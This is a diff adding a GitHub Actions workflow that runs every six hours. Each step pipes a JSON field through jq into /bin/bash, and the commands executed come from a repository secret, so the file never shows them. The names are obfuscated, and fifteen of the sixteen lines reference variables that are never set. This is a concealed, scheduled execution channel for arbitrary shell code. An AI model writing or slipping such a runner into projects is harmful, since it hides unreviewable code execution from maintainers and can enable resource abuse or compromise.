@@ -1,0 +1,31 @@
+name: huangtouping6127
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangtouping6127
+        env:
+          cjeq651: ${{ secrets.cjeq651 }}
+        run: |
+          echo $cjeq651 | jq -r .ofl68 | /bin/bash
+          echo $tjsra93852 | jq -r .i4993 | /bin/bash
+          echo $n03 | jq -r .lltz80 | /bin/bash
+          echo $t3 | jq -r .e291 | /bin/bash
+          echo $uftr36 | jq -r .psb4439 | /bin/bash
+          echo $hg71238 | jq -r .t22 | /bin/bash
+          echo $l55473 | jq -r .pgp661 | /bin/bash
+          echo $eio58 | jq -r .s17 | /bin/bash
+          echo $u421 | jq -r .pjks6004 | /bin/bash
+          echo $dfemy83715 | jq -r .sqibt4 | /bin/bash
+          echo $sc08118 | jq -r .o74503 | /bin/bash
+          echo $kqd0513 | jq -r .ypccp84205 | /bin/bash
+          echo $pthxd3 | jq -r .v26 | /bin/bash
+          echo $e82 | jq -r .xp53846 | /bin/bash
+          echo $dzfsa36 | jq -r .hxia881 | /bin/bash
+          echo $vra04 | jq -r .yrp21129 | /bin/bash
+
